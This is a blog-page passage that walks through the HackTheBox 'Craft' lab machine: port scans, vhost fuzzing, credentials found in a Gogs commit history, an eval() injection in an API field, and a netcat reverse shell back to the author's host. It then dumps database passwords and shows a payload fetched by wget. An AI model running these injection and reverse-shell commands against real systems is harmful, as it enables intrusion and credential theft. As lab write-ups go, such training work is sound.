@@ -1,0 +1,701 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CrazyInSide">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon:1234567891011121314151617181920212223242526272829303132333435363738394041424344Crazy:~$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.110[sudo] crazyinside 的密码：Starting masscan">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Craft">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Craft/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Recon:1234567891011121314151617181920212223242526272829303132333435363738394041424344Crazy:~$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.110[sudo] crazyinside 的密码：Starting masscan">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/Craft.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829131251254.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829133148314.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829165448986.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829165559147.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829170726516.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829173504487.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.889Z">
+<meta property="article:modified_time" content="2022-08-29T10:01:14.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/Craft.png">
+  
+  
+  
+  <title>HackTheBox-Craft - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Craft"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          83 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Craft</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://www.worldisend.com/img/Craft.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="Craft"></p>
+<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.110<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-29 05:04:10 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 6022/tcp on 10.10.10.110                                  <br>Discovered open port 22/tcp on 10.10.10.110                                    <br>Discovered open port 443/tcp on 10.10.10.110  <br>Crazy:~$ sudo nmap -sC -sV 10.10.10.110 -p6022,22,443 -Pn               <br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-29 13:07 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.110<br>Host is up (0.15s latency).<br><br>PORT     STATE SERVICE  VERSION<br>22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 bde76c22817adb3ec0f0731df3af7765 (RSA)<br>|   256 82b5f9d1953b6d800f3591862db3d766 (ECDSA)<br>|_  256 283b2618ecdfb336859c27548d8ce133 (ED25519)<br>443/tcp  open  ssl/http nginx 1.15.8<br>|_http-title: About<br>| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US<br>| Not valid before: 2019-02-06T02:25:47<br>|_Not valid after:  2020-06-20T02:25:47<br>|_http-server-header: nginx/1.15.8<br>| tls-alpn: <br>|_  http/1.1<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>| tls-nextprotoneg: <br>|_  http/1.1<br>6022/tcp open  ssh      (protocol 2.0)<br>| fingerprint-strings: <br>|   NULL: <br>|_    SSH-2.0-Go<br>| ssh-hostkey: <br>|_  2048 5bccbff1a18f72b0c0fbdfa301dca6fb (RSA)<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://ParrotOS.org/cgi-bin/submit.cgi?new-service :<br>SF-Port6022-TCP:V=7.92SVN%I=7%D=8/29%Time=630C4983%P=x86_64-unknown-linux-<br>SF:gnu%r(NULL,C,<span class="hljs-string">&quot;SSH-2\.0-Go\r\n&quot;</span>);<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 47.16 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.110 -p6022,22,443 -Pn<br></code></pre></td></tr></table></figure>
+
+<p>一个新域名：</p>
+<p><img src="https://www.worldisend.com/img/image-20220829131251254.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829131251254"></p>
+<p><img src="https://www.worldisend.com/img/image-20220829133148314.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829133148314"></p>
+<p>暂时不知道做什么。尝试枚举了vhost：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~$ wfuzz -u https://craft.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H <span class="hljs-string">&quot;Host:FUZZ.craft.htb&quot;</span> --hh 3779<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: https://craft.htb/</span><br><span class="hljs-string">Total requests: 114441</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                                         </span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000051:   404        4 L      34 W       233 Ch      &quot;api&quot;                                                                                                                                                                                                           </span><br><span class="hljs-string">000005934:   404        1 L      4 W        19 Ch       &quot;vault&quot;                                                                                                                                                                                                                                                                                                                                                     </span><br><span class="hljs-string">000000001:   200        245 L    612 W      7703 Ch     &quot;gogs&quot;                                                             </span><br><span class="hljs-string"></span><br><span class="hljs-string">Total time: 1407.494</span><br><span class="hljs-string">Processed Requests: 114441</span><br><span class="hljs-string">Filtered Requests: 114439</span><br></code></pre></td></tr></table></figure>
+
+<p>vault无法访问，gogs站点是一个gogs代码托管的应用程序，在里边搜索了半天，看到了test.py文件历史提交中，有一组账号密码：</p>
+<p><img src="https://www.worldisend.com/img/image-20220829165448986.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829165448986"></p>
+<p>尝试登录会生成一个token：</p>
+<p><img src="https://www.worldisend.com/img/image-20220829165559147.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829165559147"></p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNjYxNzYzNzMzfQ.kYsVaandH5VO4sonVurHK2zgDsHiMMZM2g-5OVUWLXA&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>在brew.py历史提交中有一个eval函数，它用来接收abv的值：</p>
+<p><img src="https://www.worldisend.com/img/image-20220829170726516.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829170726516"></p>
+<p>找到对应的brew端点：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~$ curl -X POST <span class="hljs-string">&quot;https://api.craft.htb/api/brew/&quot;</span> -H  <span class="hljs-string">&quot;accept: application/json&quot;</span> -H  <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> -d <span class="hljs-string">&quot;&#123;</span><br><span class="hljs-string">\&quot;id\&quot;: 0,</span><br><span class="hljs-string">\&quot;brewer\&quot;: \&quot;crazy\&quot;,</span><br><span class="hljs-string">\&quot;name\&quot;: \&quot;inside\&quot;,</span><br><span class="hljs-string">\&quot;style\&quot;: \&quot;bad\&quot;,</span><br><span class="hljs-string">\&quot;abv\&quot;: \&quot;__import__(&#x27;os&#x27;).system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.3 1337 &gt;/tmp/f&#x27;)\&quot;&#125;&quot;</span> -k -H <span class="hljs-string">&quot;X-CRAFT-API-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNjYxNzY0NDMzfQ.k4qXLTiaGa5Z5qJfUBuGSrZo_Ws6D7QcRcYMBGKqAqE&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.110] 44661<br>/bin/sh: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">/opt/app # script -qc /bin/bash /dev/null</span><br><span class="hljs-string">/bin/sh: script: not found</span><br></code></pre></td></tr></table></figure>
+
+<p>在一个docker中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ <span class="hljs-comment"># ls -all</span><br>total 64<br>drwxr-xr-x    1 root     root          4096 Feb 10  2019 .<br>drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..<br>-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv<br>drwxr-xr-x    1 root     root          4096 Feb  6  2019 bin<br>drwxr-xr-x    5 root     root           340 Aug 29 05:04 dev<br>drwxr-xr-x    1 root     root          4096 Feb 10  2019 etc<br>drwxr-xr-x    2 root     root          4096 Jan 30  2019 home<br>drwxr-xr-x    1 root     root          4096 Feb  6  2019 lib<br>drwxr-xr-x    5 root     root          4096 Jan 30  2019 media<br>drwxr-xr-x    2 root     root          4096 Jan 30  2019 mnt<br>drwxr-xr-x    1 root     root          4096 Feb  9  2019 opt<br>dr-xr-xr-x  164 root     root             0 Aug 29 05:04 proc<br>drwx------    1 root     root          4096 Feb  9  2019 root<br>drwxr-xr-x    2 root     root          4096 Jan 30  2019 run<br>drwxr-xr-x    2 root     root          4096 Jan 30  2019 sbin<br>drwxr-xr-x    2 root     root          4096 Jan 30  2019 srv<br>dr-xr-xr-x   13 root     root             0 Aug 29 05:04 sys<br>drwxrwxrwt    1 root     root          4096 Aug 29 09:11 tmp<br>drwxr-xr-x    1 root     root          4096 Feb  9  2019 usr<br>drwxr-xr-x    1 root     root          4096 Jan 30  2019 var<br>/ <span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>在/opt/app/craft_api有一组用以链接数据库的凭证。还有一串秘钥，或许是用来做令牌的？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">/opt/app/craft_api <span class="hljs-comment"># cat settings.py</span><br><span class="hljs-comment"># Flask settings</span><br>FLASK_SERVER_NAME = <span class="hljs-string">&#x27;api.craft.htb&#x27;</span><br>FLASK_DEBUG = False  <span class="hljs-comment"># Do not use debug mode in production</span><br><br><span class="hljs-comment"># Flask-Restplus settings</span><br>RESTPLUS_SWAGGER_UI_DOC_EXPANSION = <span class="hljs-string">&#x27;list&#x27;</span><br>RESTPLUS_VALIDATE = True<br>RESTPLUS_MASK_SWAGGER = False<br>RESTPLUS_ERROR_404_HELP = False<br>CRAFT_API_SECRET = <span class="hljs-string">&#x27;hz66OCkDtv8G6D&#x27;</span><br><br><span class="hljs-comment"># database</span><br>MYSQL_DATABASE_USER = <span class="hljs-string">&#x27;craft&#x27;</span><br>MYSQL_DATABASE_PASSWORD = <span class="hljs-string">&#x27;qLGockJ6G2J75O&#x27;</span><br>MYSQL_DATABASE_DB = <span class="hljs-string">&#x27;craft&#x27;</span><br>MYSQL_DATABASE_HOST = <span class="hljs-string">&#x27;db&#x27;</span><br>SQLALCHEMY_TRACK_MODIFICATIONS = False<br>/opt/app/craft_api <span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>还要一个用来测试数据库的python脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">/opt/app <span class="hljs-comment"># ls</span><br>app.py<br>craft_api<br>dbtest.py<br>tests<br>/opt/app <span class="hljs-comment"># python datest.py</span><br>python: can<span class="hljs-string">&#x27;t open file &#x27;</span>datest.py<span class="hljs-string">&#x27;: [Errno 2] No such file or directory</span><br><span class="hljs-string">/opt/app # python dbtest.py</span><br><span class="hljs-string">&#123;&#x27;</span><span class="hljs-built_in">id</span><span class="hljs-string">&#x27;: 12, &#x27;</span>brewer<span class="hljs-string">&#x27;: &#x27;</span>10 Barrel Brewing Company<span class="hljs-string">&#x27;, &#x27;</span>name<span class="hljs-string">&#x27;: &#x27;</span>Pub Beer<span class="hljs-string">&#x27;, &#x27;</span>abv<span class="hljs-string">&#x27;: Decimal(&#x27;</span>0.050<span class="hljs-string">&#x27;)&#125;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">/opt/app <span class="hljs-comment"># cat dbtest.py                                                                                                                                                                                                               </span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><br>import pymysql<br>from craft_api import settings<br><br><span class="hljs-comment"># test connection to mysql database</span><br><br>connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,<br>                             user=settings.MYSQL_DATABASE_USER,<br>                             password=settings.MYSQL_DATABASE_PASSWORD,<br>                             db=settings.MYSQL_DATABASE_DB,<br>                             cursorclass=pymysql.cursors.DictCursor)<br><br>try: <br>    with connection.cursor() as cursor:<br>        sql = <span class="hljs-string">&quot;SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1&quot;</span><br>        cursor.execute(sql)<br>        result = cursor.fetchone()<br>        <span class="hljs-built_in">print</span>(result)<br><br>finally:<br>    connection.close()/opt/app <span class="hljs-comment"># </span><br><br></code></pre></td></tr></table></figure>
+
+<p>可以将sql改成人为可控参数会方便很多：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> pymysql<br><span class="hljs-keyword">import</span> sys                              <br><span class="hljs-keyword">from</span> craft_api <span class="hljs-keyword">import</span> settings<br>                                   <br><span class="hljs-comment"># test connection to mysql database</span><br>                                                               <br>connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,<br>                             user=settings.MYSQL_DATABASE_USER,        <br>                             password=settings.MYSQL_DATABASE_PASSWORD,<br>                             db=settings.MYSQL_DATABASE_DB,         <br>                             cursorclass=pymysql.cursors.DictCursor)<br>    <br><span class="hljs-keyword">try</span>:                                   <br>    <span class="hljs-keyword">with</span> connection.cursor() <span class="hljs-keyword">as</span> cursor:                                 <br>        sql = sys.argv[<span class="hljs-number">1</span>]<br>        cursor.execute(sql)       <br>        result = cursor.fetchall()<br>        <span class="hljs-built_in">print</span>(result)<br>        <br><span class="hljs-keyword">finally</span>:              <br>    connection.close()<br></code></pre></td></tr></table></figure>
+
+<p>可以本地改好通过wget去传送入目标：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">/opt/app <span class="hljs-comment"># wget http://10.10.16.3/dbtest.py</span><br>Connecting to 10.10.16.3 (10.10.16.3:80)<br>wget: can<span class="hljs-string">&#x27;t open &#x27;</span>dbtest.py<span class="hljs-string">&#x27;: File exists</span><br><span class="hljs-string">/opt/app # mv dbtest.py .dbtest.py</span><br><span class="hljs-string">/opt/app # wget http://10.10.16.3/dbtest.py</span><br><span class="hljs-string">Connecting to 10.10.16.3 (10.10.16.3:80)</span><br><span class="hljs-string">dbtest.py            100% |********************************|   883  0:00:00 ETA</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">/opt/app <span class="hljs-comment"># python3 dbtest.py &#x27;SELECT USER()&#x27;</span><br>[&#123;<span class="hljs-string">&#x27;USER()&#x27;</span>: <span class="hljs-string">&#x27;craft@172.20.0.6&#x27;</span>&#125;]<br>/opt/app <span class="hljs-comment"># python dbtest.py &#x27;show databases&#x27;</span><br>[&#123;<span class="hljs-string">&#x27;Database&#x27;</span>: <span class="hljs-string">&#x27;craft&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;Database&#x27;</span>: <span class="hljs-string">&#x27;information_schema&#x27;</span>&#125;]<br>/opt/app <span class="hljs-comment"># python dbtest.py &#x27;use craft&#x27;</span><br>/opt/app <span class="hljs-comment"># python dbtest.py &#x27;show tables&#x27;</span><br>[&#123;<span class="hljs-string">&#x27;Tables_in_craft&#x27;</span>: <span class="hljs-string">&#x27;brew&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;Tables_in_craft&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>&#125;]<br>/opt/app <span class="hljs-comment"># python dbtest.py &#x27;SELECT * FROM user&#x27;</span><br>[&#123;<span class="hljs-string">&#x27;id&#x27;</span>: 1, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;dinesh&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;4aUh0A8PbVJxgd&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: 4, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;ebachman&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;llJ77D8QFkLPQB&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: 5, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;gilfoyle&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;ZEU3N8WNM2rh4T&#x27;</span>&#125;]<br></code></pre></td></tr></table></figure>
+
+<p>还有两个用户名与口令。有一个可以登录gogs，里边有一个id_rsa秘钥：</p>
